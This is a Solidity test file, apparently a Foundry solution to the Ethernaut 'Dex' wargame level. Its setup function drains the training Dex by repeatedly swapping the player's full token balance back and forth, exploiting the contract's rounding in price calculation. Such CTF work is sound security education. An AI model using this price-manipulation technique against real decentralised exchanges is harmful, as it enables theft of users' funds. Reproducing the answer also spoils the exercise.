// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {Dex, DexFactory, IERC20} from "ethernaut/levels/DexFactory.sol";

contract DexLevel is SetUpLevelTest {
    Dex internal dex;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        instanceBalance = 0 ether;
        playerBalance = 0 ether;
        level = address(new DexFactory());
        super.setUp();
        dex = Dex(instance);

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        address token1 = dex.token1();
        address token2 = dex.token2();
        dex.approve(address(dex), 1000);
        for (uint256 i; i < 5; ++i) {
            i % 2 == 0
                ? dex.swap(token1, token2, IERC20(token1).balanceOf(player))
                : dex.swap(token2, token1, IERC20(token2).balanceOf(player));
        }
        dex.swap(token2, token1, 45);
        vm.stopPrank();
    }
}
